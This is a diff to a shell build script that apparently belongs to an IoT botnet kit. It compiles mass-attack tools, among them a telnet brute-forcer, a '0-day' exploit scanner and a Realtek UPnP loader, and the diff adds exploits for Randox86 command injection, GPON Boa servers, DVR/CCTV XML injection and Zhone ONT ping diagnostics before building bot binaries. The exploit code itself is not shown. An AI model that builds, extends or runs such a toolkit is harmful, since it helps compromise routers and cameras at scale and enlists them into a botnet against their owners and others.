@@ -70,7 +70,11 @@ cd extrascanners
 go build -o ../extrascanners/telnet-scanner telnet-scanner.go
 go build -o ../extrascanners/0day-exploit 0day-exploit.go
 go build -o ../extrascanners/realtek-loader realtek-loader.go
-chmod +x ../extrascanners/telnet-scanner ../extrascanners/0day-exploit ../extrascanners/realtek-loader ../extrascanners/run-all.sh
+go build -o ../extrascanners/randox86 randox86.go
+go build -o ../extrascanners/fiber fiber.go
+go build -o ../extrascanners/dvr dvr.go
+go build -o ../extrascanners/zhone zhone.go
+chmod +x ../extrascanners/telnet-scanner ../extrascanners/0day-exploit ../extrascanners/realtek-loader ../extrascanners/randox86 ../extrascanners/fiber ../extrascanners/dvr ../extrascanners/zhone ../extrascanners/run-all.sh
 cd ..
 echo "[+] Extra Scanners built successfully"
 echo ""
@@ -78,7 +82,11 @@ echo "[*] Extra Scanners location: ./extrascanners/"
 echo "    - telnet-scanner   (Mass telnet brute-force)"
 echo "    - 0day-exploit     (0-day exploit scanner)"
 echo "    - realtek-loader   (Realtek UPnP loader)"
-echo "    - run-all.sh       (Run all 3 simultaneously)"
+echo "    - randox86         (Randox86 command injection)"
+echo "    - fiber            (Fiber/GPON Boa server exploit)"
+echo "    - dvr              (DVR/CCTV camera XML injection)"
+echo "    - zhone            (Zhone ONT/OLT ping diagnostic exploit)"
+echo "    - run-all.sh       (Run all 7 simultaneously)"
 
 echo ""
 echo "[*] Building Bot binaries..."
